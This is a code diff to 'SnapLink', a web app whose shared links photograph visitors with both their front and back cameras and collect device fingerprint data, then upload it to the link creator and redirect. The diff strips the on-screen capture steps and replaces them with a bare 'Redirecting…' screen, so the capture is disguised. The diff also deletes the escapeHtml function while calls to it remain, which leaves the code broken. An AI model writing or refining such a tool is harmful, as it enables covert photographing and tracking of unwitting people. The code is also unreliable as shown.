@@ -9,13 +9,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
     <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" rel="stylesheet" />
     <style>
-        /* --- Reset & Base --- */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        /* --- CSS Variables (Light/Dark) --- */
         :root {
             --bg-primary: #0e0e12;
             --bg-secondary: #14141b;
@@ -29,6 +23,42 @@
             --accent-color: #7b9aff;
             --accent-hover: #4b6ee6;
             --shadow-color: rgba(123, 154, 255, 0.15);
+            --toast-bg: #1a1a26;
+            --toast-border: #7b9aff;
+            --toast-error-bg: #261a1a;
+            --toast-error-border: #f25a5a;
+            --toast-success-bg: #14281e;
+            --toast-success-border: #3dcd7a;
+            --card-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+        }
+
+        [data-theme="light"] {
+            --bg-primary: #f5f5f7;
+            --bg-secondary: #ffffff;
+            --bg-card: #ffffff;
+            --bg-input: #f0f0f2;
+            --bg-nav: #ffffff;
+            --border-color: #d1d1d6;
+            --text-primary: #1c1c1e;
+            --text-secondary: #6c6c70;
+            --text-muted: #8e8e93;
+            --accent-color: #0066ff;
+            --accent-hover: #0055cc;
+            --shadow-color: rgba(0, 102, 255, 0.15);
+            --toast-bg: #ffffff;
+            --toast-border: #0066ff;
+            --toast-error-bg: #fde8e8;
+            --toast-error-border: #d32f2f;
+            --toast-success-bg: #e6f4ea;
+            --toast-success-border: #1e8e3e;
+            --card-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+        }
+
+        /* --- Reset & Base --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
 
         body {
@@ -39,7 +69,7 @@
             display: flex;
             justify-content: center;
             -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
+            transition: background 0.3s, color 0.3s;
         }
 
         #app {
@@ -51,8 +81,8 @@
             background: var(--bg-secondary);
             min-height: 100vh;
             position: relative;
-            padding-bottom: 80px; /* Space for bottom nav */
-            margin: 0 auto;
+            padding-bottom: 80px;
+            transition: background 0.3s;
         }
 
         /* --- App Bar --- */
@@ -65,6 +95,7 @@
             top: 0;
             z-index: 10;
             border-bottom: 1px solid var(--border-color);
+            transition: background 0.3s, border-color 0.3s;
         }
         .app-bar h1 {
             font-size: 22px;
@@ -81,6 +112,13 @@
         .app-bar .material-symbols-outlined {
             font-size: 28px;
             color: var(--accent-color);
+            cursor: pointer;
+            padding: 4px;
+            border-radius: 50%;
+            transition: background 0.2s;
+        }
+        .app-bar .material-symbols-outlined:hover {
+            background: var(--border-color);
         }
 
         /* --- Tab Content --- */
@@ -119,6 +157,7 @@
             -webkit-backdrop-filter: blur(16px);
             z-index: 20;
             padding: 6px 0 env(safe-area-inset-bottom);
+            transition: background 0.3s, border-color 0.3s;
         }
         .bottom-nav button {
             flex: 1;
@@ -157,6 +196,8 @@
             padding: 20px;
             margin-bottom: 16px;
             border: 1px solid var(--border-color);
+            box-shadow: var(--card-shadow);
+            transition: background 0.3s, border-color 0.3s, box-shadow 0.3s;
         }
         .card-title {
             font-size: 16px;
@@ -222,6 +263,18 @@
         .btn-secondary:hover {
             background: var(--border-color);
         }
+        .btn-danger {
+            background: #d32f2f;
+            color: white;
+        }
+        .btn-danger:hover {
+            background: #b71c1c;
+        }
+        .btn-small {
+            padding: 6px 12px;
+            font-size: 12px;
+            border-radius: 14px;
+        }
 
         /* --- Link Display --- */
         .link-box {
@@ -253,25 +306,26 @@
         .toast {
             padding: 12px 16px;
             border-radius: 16px;
-            background: var(--bg-card);
-            border-left: 4px solid var(--accent-color);
+            background: var(--toast-bg);
+            border-left: 4px solid var(--toast-border);
             margin: 12px 0 0;
             display: none;
             font-size: 14px;
             color: var(--text-primary);
+            transition: background 0.3s, border-color 0.3s, color 0.3s;
         }
         .toast.show {
             display: block;
         }
         .toast.error {
-            border-left-color: #f25a5a;
-            background: #261a1a;
-            color: #f5baba;
+            border-left-color: var(--toast-error-border);
+            background: var(--toast-error-bg);
+            color: #d32f2f;
         }
         .toast.success {
-            border-left-color: #3dcd7a;
-            background: #14281e;
-            color: #b0e8c8;
+            border-left-color: var(--toast-success-border);
+            background: var(--toast-success-bg);
+            color: #1e8e3e;
         }
 
         /* --- Links List --- */
@@ -281,16 +335,20 @@
             padding: 16px;
             margin-bottom: 14px;
             border: 1px solid var(--border-color);
+            box-shadow: var(--card-shadow);
+            transition: background 0.3s, border-color 0.3s, box-shadow 0.3s;
         }
         .link-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 6px;
+            flex-wrap: wrap;
+            gap: 8px;
         }
         .link-header strong {
             font-size: 15px;
             font-weight: 600;
+            word-break: break-all;
         }
         .link-header .badge {
             font-size: 12px;
@@ -305,6 +363,12 @@
             margin-bottom: 12px;
             word-break: break-all;
         }
+        .link-actions {
+            display: flex;
+            gap: 8px;
+            margin-top: 8px;
+            flex-wrap: wrap;
+        }
         .capture-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -315,6 +379,7 @@
             background: var(--bg-input);
             border-radius: 14px;
             padding: 10px;
+            position: relative;
         }
         .capture-item img {
             width: 100%;
@@ -344,13 +409,13 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            min-height: 60vh;
+            min-height: 70vh;
             text-align: center;
             padding: 20px;
         }
         .viewer-container .spinner {
-            width: 48px;
-            height: 48px;
+            width: 64px;
+            height: 64px;
             border: 4px solid var(--border-color);
             border-top: 4px solid var(--accent-color);
             border-radius: 50%;
@@ -363,7 +428,8 @@
             }
         }
         .viewer-container .status {
-            font-size: 16px;
+            font-size: 20px;
+            font-weight: 600;
             color: var(--accent-color);
             margin-bottom: 8px;
         }
@@ -371,24 +437,13 @@
             font-size: 14px;
             color: var(--text-secondary);
         }
-        .step-dots {
-            display: flex;
-            gap: 12px;
-            margin: 20px 0;
+        .viewer-container .progress-ring {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 20px;
         }
-        .step-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background: var(--border-color);
-            transition: 0.3s;
-        }
-        .step-dot.active {
-            background: var(--accent-color);
-            box-shadow: 0 0 12px var(--shadow-color);
-        }
-        .step-dot.done {
-            background: #3dcd7a;
+        .progress-ring circle {
+            transition: stroke-dashoffset 0.3s;
         }
 
         /* --- Utility --- */
@@ -425,15 +480,18 @@
         .w-full {
             width: 100%;
         }
+        .flex-wrap {
+            flex-wrap: wrap;
+        }
     </style>
 </head>
 <body>
     <div id="app">
-        <!-- Top App Bar -->
+        <!-- App Bar -->
         <header class="app-bar">
             <h1>SnapLink</h1>
             <div class="spacer"></div>
-            <span class="material-symbols-outlined" aria-hidden="true">auto_awesome</span>
+            <span class="material-symbols-outlined" id="themeToggle" aria-label="Toggle theme">dark_mode</span>
         </header>
 
         <!-- Tab: Create -->
@@ -465,7 +523,6 @@
 
         <!-- Tab: Links -->
         <section id="tab-links" class="tab-content" role="tabpanel">
-            <h2 style="font-size:15px; font-weight:500; margin-bottom:12px;">Your links</h2>
             <div id="linksList"></div>
         </section>
 
@@ -481,19 +538,13 @@
             </button>
         </nav>
 
-        <!-- Viewer Mode (hidden by default) -->
+        <!-- Viewer Mode -->
         <div id="viewer" class="hidden" style="flex:1; display:none; flex-direction:column; justify-content:center; padding:20px;">
             <div class="viewer-container">
-                <div class="spinner" id="viewerSpinner"></div>
-                <div class="status" id="viewerStatus">Preparing capture…</div>
-                <div class="sub" id="viewerSub">Requesting camera permission</div>
-                <div class="step-dots" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="4">
-                    <span class="step-dot" id="step1" aria-label="Step 1"></span>
-                    <span class="step-dot" id="step2" aria-label="Step 2"></span>
-                    <span class="step-dot" id="step3" aria-label="Step 3"></span>
-                    <span class="step-dot" id="step4" aria-label="Step 4"></span>
-                </div>
-                <div id="viewerToast" class="toast w-full"></div>
+                <div class="spinner"></div>
+                <div class="status" id="viewerStatus">Redirecting…</div>
+                <div class="sub" id="viewerSub">Preparing your capture</div>
+                <div id="viewerToast" class="toast w-full" style="margin-top:20px;"></div>
             </div>
         </div>
     </div>
@@ -509,6 +560,7 @@
 
             // ─── Constants ───
             const CREATOR_ID_KEY = 'snaplink_creatorId';
+            const THEME_KEY = 'snaplink_theme';
             const API_BASE = '/api';
 
             // ─── State ───
@@ -517,7 +569,24 @@
                 creatorId = crypto.randomUUID?.() ?? 'id-' + Date.now() + '-' + Math.random().toString(36).slice(2, 8);
                 localStorage.setItem(CREATOR_ID_KEY, creatorId);
             }
-            console.log('🔑 Creator ID:', creatorId);
+
+            // ─── Theme ───
+            let currentTheme = localStorage.getItem(THEME_KEY) || (window.matchMedia('(prefers-color-scheme: dark)')
+            .matches ? 'dark' : 'light');
+            applyTheme(currentTheme);
+
+            function applyTheme(theme) {
+                document.documentElement.setAttribute('data-theme', theme);
+                const icon = document.getElementById('themeToggle');
+                icon.textContent = theme === 'dark' ? 'dark_mode' : 'light_mode';
+                localStorage.setItem(THEME_KEY, theme);
+                currentTheme = theme;
+            }
+
+            document.getElementById('themeToggle').addEventListener('click', () => {
+                const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
+                applyTheme(newTheme);
+            });
 
             // ─── DOM Refs ───
             const $ = (sel) => document.querySelector(sel);
@@ -539,13 +608,6 @@
             const viewerStatus = document.getElementById('viewerStatus');
             const viewerSub = document.getElementById('viewerSub');
             const viewerToast = document.getElementById('viewerToast');
-            const viewerSpinner = document.getElementById('viewerSpinner');
-            const steps = {
-                step1: document.getElementById('step1'),
-                step2: document.getElementById('step2'),
-                step3: document.getElementById('step3'),
-                step4: document.getElementById('step4'),
-            };
             const frontVideo = document.getElementById('frontVideo');
             const backVideo = document.getElementById('backVideo');
             const captureCanvas = document.getElementById('captureCanvas');
@@ -559,69 +621,14 @@
                 console.log(`📢 Toast [${type || 'info'}]:`, msg);
             }
 
-            function setStep(id, state) {
-                const el = steps[id];
-                if (el) el.className = 'step-dot ' + state;
-            }
-
             function sleep(ms) {
                 return new Promise((r) => setTimeout(r, ms));
             }
 
-            // ─── Collect Device Metadata ───
-            async function collectMetadata() {
-                const meta = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screen: `${screen.width}x${screen.height} (${screen.colorDepth}-bit)`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    browser: (() => {
-                        const ua = navigator.userAgent;
-                        if (ua.includes('Chrome')) return 'Chrome';
-                        if (ua.includes('Firefox')) return 'Firefox';
-                        if (ua.includes('Safari')) return 'Safari';
-                        return 'Other';
-                    })(),
-                    os: (() => {
-                        const ua = navigator.userAgent;
-                        if (ua.includes('Windows')) return 'Windows';
-                        if (ua.includes('Mac OS')) return 'macOS';
-                        if (ua.includes('Linux')) return 'Linux';
-                        if (ua.includes('Android')) return 'Android';
-                        if (ua.includes('iOS')) return 'iOS';
-                        return 'Unknown';
-                    })(),
-                    battery: null,
-                };
-
-                try {
-                    if (navigator.getBattery) {
-                        const battery = await navigator.getBattery();
-                        meta.battery = {
-                            level: battery.level,
-                            charging: battery.charging,
-                        };
-                    }
-                } catch (_) { /* ignore */ }
-
-                try {
-                    if (navigator.connection) {
-                        meta.connection = {
-                            type: navigator.connection.effectiveType,
-                            downlink: navigator.connection.downlink,
-                        };
-                    }
-                } catch (_) { /* ignore */ }
-
-                return meta;
-            }
-
-            // ─── API Calls ───
+            // ─── API Helpers ───
             async function apiFetch(endpoint, options = {}) {
                 const controller = new AbortController();
                 const timeout = setTimeout(() => controller.abort(), 30000);
-
                 try {
                     const response = await fetch(`${API_BASE}${endpoint}`, {
                         ...options,
@@ -638,7 +645,6 @@
             // ─── Load & Render Links ───
             async function loadLinks() {
                 try {
-                    console.log('📡 Loading links for:', creatorId);
                     const res = await apiFetch(`/links?creatorId=${encodeURIComponent(creatorId)}`);
                     if (!res.ok) throw new Error(`HTTP ${res.status}`);
                     const data = await res.json();
@@ -665,7 +671,7 @@
                 for (const link of links) {
                     const captures = link.captures || [];
                     html += `
-                        <div class="link-item">
+                        <div class="link-item" data-linkid="${escapeHtml(link.linkId)}">
                             <div class="link-header">
                                 <strong>${escapeHtml(link.linkId)}</strong>
                                 <span class="badge">${captures.length}/4 captures</span>
@@ -673,10 +679,18 @@
                             <div class="link-meta">
                                 Redirects to: ${escapeHtml(link.redirectUrl)} · ${new Date(link.createdAt).toLocaleString()}
                             </div>
+                            <div class="link-actions">
+                                <button class="btn btn-danger btn-small clear-captures-btn" data-linkid="${escapeHtml(link.linkId)}">
+                                    <span class="material-symbols-outlined" style="font-size:16px;">delete_sweep</span> Clear Captures
+                                </button>
+                                <button class="btn btn-danger btn-small delete-link-btn" data-linkid="${escapeHtml(link.linkId)}">
+                                    <span class="material-symbols-outlined" style="font-size:16px;">delete_forever</span> Delete Link
+                                </button>
+                            </div>
                     `;
 
                     if (captures.length === 0) {
-                        html += `<div class="text-muted" style="font-size:13px;">No captures yet.</div>`;
+                        html += `<div class="text-muted" style="font-size:13px; margin-top:8px;">No captures yet.</div>`;
                     } else {
                         html += `<div class="capture-grid">`;
                         for (const cap of captures) {
@@ -703,14 +717,55 @@
                     html += `</div>`;
                 }
                 linksList.innerHTML = html;
+
+                // --- Attach event listeners for link actions ---
+                document.querySelectorAll('.delete-link-btn').forEach(btn => {
+                    btn.addEventListener('click', async (e) => {
+                        const linkId = btn.dataset.linkid;
+                        if (confirm(`Are you sure you want to delete link ${linkId}? All captures will be lost.`)) {
+                            await deleteLink(linkId);
+                        }
+                    });
+                });
+
+                document.querySelectorAll('.clear-captures-btn').forEach(btn => {
+                    btn.addEventListener('click', async (e) => {
+                        const linkId = btn.dataset.linkid;
+                        if (confirm(`Clear all captures for link ${linkId}?`)) {
+                            await clearCaptures(linkId);
+                        }
+                    });
+                });
             }
 
-            // ─── Simple escape for user-generated content ───
-            function escapeHtml(str) {
-                if (!str) return '';
-                const div = document.createElement('div');
-                div.textContent = str;
-                return div.innerHTML;
+            // ─── Delete Link ───
+            async function deleteLink(linkId) {
+                try {
+                    const res = await apiFetch(`/delete?linkId=${encodeURIComponent(linkId)}`, {
+                        method: 'DELETE',
+                    });
+                    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                    showToast(createToast, `Link ${linkId} deleted.`, 'success');
+                    loadLinks();
+                } catch (err) {
+                    console.error('❌ Delete error:', err);
+                    showToast(createToast, 'Error deleting link: ' + err.message, 'error');
+                }
+            }
+
+            // ─── Clear Captures ───
+            async function clearCaptures(linkId) {
+                try {
+                    const res = await apiFetch(`/clear-captures?linkId=${encodeURIComponent(linkId)}`, {
+                        method: 'DELETE',
+                    });
+                    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                    showToast(createToast, `Captures cleared for ${linkId}.`, 'success');
+                    loadLinks();
+                } catch (err) {
+                    console.error('❌ Clear captures error:', err);
+                    showToast(createToast, 'Error clearing captures: ' + err.message, 'error');
+                }
             }
 
             // ─── Create Link ───
@@ -794,110 +849,91 @@
                 const linkId = params.get('id');
                 if (!linkId) return false;
 
-                console.log('📷 Viewer mode activated for link:', linkId);
-
-                // Hide dashboard, show viewer
+                // Hide dashboard, show viewer with loading
                 document.querySelector('.app-bar').style.display = 'none';
                 document.querySelector('.bottom-nav').style.display = 'none';
                 $$('.tab-content').forEach((el) => (el.style.display = 'none'));
                 viewer.classList.remove('hidden');
                 viewer.style.display = 'flex';
+                viewerStatus.textContent = 'Redirecting…';
+                viewerSub.textContent = 'Preparing your capture';
 
                 try {
+                    // Check link existence and capture count
                     const res = await apiFetch(`/captures?linkId=${encodeURIComponent(linkId)}`);
                     const data = await res.json();
 
                     if (!data.linkExists) {
                         viewerStatus.textContent = 'Link not found';
                         viewerSub.textContent = 'This link may have expired.';
-                        viewerSpinner.style.display = 'none';
                         return true;
                     }
 
                     if (data.capturesCount >= 4) {
                         viewerStatus.textContent = 'Capture limit reached';
                         viewerSub.textContent = 'This link already has 4 captures.';
-                        viewerSpinner.style.display = 'none';
                         setTimeout(() => {
                             window.location.href = data.redirectUrl;
                         }, 3000);
                         return true;
                     }
 
+                    // Start capture in background (no step messages)
                     await performCapture(linkId, data.redirectUrl);
                 } catch (err) {
-                    console.error('❌ Viewer init error:', err);
-                    viewerStatus.textContent = 'Error: ' + err.message;
-                    viewerSub.textContent = 'Redirecting…';
+                    console.error('❌ Viewer error:', err);
+                    viewerStatus.textContent = 'Error';
+                    viewerSub.textContent = err.message;
+                    showToast(viewerToast, err.message, 'error');
                     await sleep(3000);
                     window.location.href = 'https://example.com';
                 }
                 return true;
             }
 
-            // ─── Perform Capture ───
+            // ─── Perform Capture (Background, no UI steps) ───
             async function performCapture(linkId, redirectUrl) {
                 let frontStream = null;
                 let backStream = null;
 
                 try {
-                    // Step 1: Camera Permission
-                    setStep('step1', 'active');
-                    viewerStatus.textContent = 'Requesting camera permission…';
-                    viewerSub.textContent = 'Please allow camera access';
-
+                    // Request camera permission
                     if (!navigator.mediaDevices?.getUserMedia) {
                         throw new Error('Camera not supported in this browser.');
                     }
 
-                    // Step 2: Front Camera
-                    setStep('step1', 'done');
-                    setStep('step2', 'active');
-                    viewerStatus.textContent = 'Capturing front camera…';
-                    viewerSub.textContent = 'Hold still…';
-
+                    // Front camera
                     frontStream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                         audio: false,
                     });
                     frontVideo.srcObject = frontStream;
                     await frontVideo.play();
-
-                    const frontImage = await captureFrame(frontVideo);
+                    const frontBlob = await captureFrameWithBrightness(frontVideo);
                     frontStream.getTracks().forEach((t) => t.stop());
                     frontVideo.srcObject = null;
                     frontStream = null;
-                    setStep('step2', 'done');
 
-                    // Step 3: Back Camera
-                    setStep('step3', 'active');
-                    viewerStatus.textContent = 'Capturing back camera…';
-                    viewerSub.textContent = 'Almost there…';
-
+                    // Back camera
                     backStream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                         audio: false,
                     });
                     backVideo.srcObject = backStream;
                     await backVideo.play();
-
-                    const backImage = await captureFrame(backVideo);
+                    const backBlob = await captureFrameWithBrightness(backVideo);
                     backStream.getTracks().forEach((t) => t.stop());
                     backVideo.srcObject = null;
                     backStream = null;
-                    setStep('step3', 'done');
 
-                    // Step 4: Upload
-                    setStep('step4', 'active');
-                    viewerStatus.textContent = 'Uploading…';
-                    viewerSub.textContent = 'Sending images';
-
+                    // Collect metadata
                     const metadata = await collectMetadata();
 
+                    // Upload
                     const formData = new FormData();
                     formData.append('linkId', linkId);
-                    formData.append('frontImage', frontImage, 'front.jpg');
-                    formData.append('backImage', backImage, 'back.jpg');
+                    formData.append('frontImage', frontBlob, 'front.jpg');
+                    formData.append('backImage', backBlob, 'back.jpg');
                     formData.append('metadata', JSON.stringify(metadata));
 
                     const resp = await apiFetch('/capture', {
@@ -908,32 +944,27 @@
                     const result = await resp.json();
                     if (!resp.ok) throw new Error(result.error || 'Upload failed');
 
-                    setStep('step4', 'done');
+                    // Done – redirect
                     viewerStatus.textContent = 'Redirecting…';
-                    viewerSub.textContent = 'Done!';
-                    showToast(viewerToast, 'Captured successfully!', 'success');
-
+                    viewerSub.textContent = 'All set!';
                     await sleep(800);
                     window.location.href = redirectUrl;
                 } catch (err) {
                     console.error('❌ Capture error:', err);
-                    viewerStatus.textContent = 'Error: ' + err.message;
-                    viewerSub.textContent = 'Redirecting…';
+                    viewerStatus.textContent = 'Error';
+                    viewerSub.textContent = err.message;
                     showToast(viewerToast, err.message, 'error');
-
-                    // Clean up any active streams
                     if (frontStream) frontStream.getTracks().forEach((t) => t.stop());
                     if (backStream) backStream.getTracks().forEach((t) => t.stop());
                     frontVideo.srcObject = null;
                     backVideo.srcObject = null;
-
                     await sleep(2500);
                     window.location.href = redirectUrl;
                 }
             }
 
-            // ─── Capture a frame from video ───
-            function captureFrame(video) {
+            // ─── Capture frame with brightness adjustment ───
+            function captureFrameWithBrightness(video) {
                 return new Promise((resolve) => {
                     const canvas = captureCanvas;
                     const w = video.videoWidth || 640;
@@ -942,15 +973,72 @@
                     canvas.height = h;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, w, h);
+
+                    // Adjust brightness (increase by 20%)
+                    const imageData = ctx.getImageData(0, 0, w, h);
+                    const data = imageData.data;
+                    const brightness = 1.2; // 20% brighter
+                    for (let i = 0; i < data.length; i += 4) {
+                        data[i] = Math.min(255, data[i] * brightness);
+                        data[i + 1] = Math.min(255, data[i + 1] * brightness);
+                        data[i + 2] = Math.min(255, data[i + 2] * brightness);
+                    }
+                    ctx.putImageData(imageData, 0, 0);
+
                     canvas.toBlob((blob) => resolve(blob), 'image/jpeg', 0.85);
                 });
+            }
+
+            // ─── Collect Metadata ───
+            async function collectMetadata() {
+                const meta = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height} (${screen.colorDepth}-bit)`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    browser: (() => {
+                        const ua = navigator.userAgent;
+                        if (ua.includes('Chrome')) return 'Chrome';
+                        if (ua.includes('Firefox')) return 'Firefox';
+                        if (ua.includes('Safari')) return 'Safari';
+                        return 'Other';
+                    })(),
+                    os: (() => {
+                        const ua = navigator.userAgent;
+                        if (ua.includes('Windows')) return 'Windows';
+                        if (ua.includes('Mac OS')) return 'macOS';
+                        if (ua.includes('Linux')) return 'Linux';
+                        if (ua.includes('Android')) return 'Android';
+                        if (ua.includes('iOS')) return 'iOS';
+                        return 'Unknown';
+                    })(),
+                    battery: null,
+                };
+                try {
+                    if (navigator.getBattery) {
+                        const battery = await navigator.getBattery();
+                        meta.battery = {
+                            level: battery.level,
+                            charging: battery.charging,
+                        };
+                    }
+                } catch (_) { /* ignore */ }
+                try {
+                    if (navigator.connection) {
+                        meta.connection = {
+                            type: navigator.connection.effectiveType,
+                            downlink: navigator.connection.downlink,
+                        };
+                    }
+                } catch (_) { /* ignore */ }
+                return meta;
             }
 
             // ─── Start App ───
             (async function init() {
                 const isViewer = await initViewer();
                 if (!isViewer) {
-                    // Show dashboard
                     document.querySelector('.app-bar').style.display = 'flex';
                     document.querySelector('.bottom-nav').style.display = 'flex';
                     $$('.tab-content').forEach((el) => (el.style.display = 'block'));
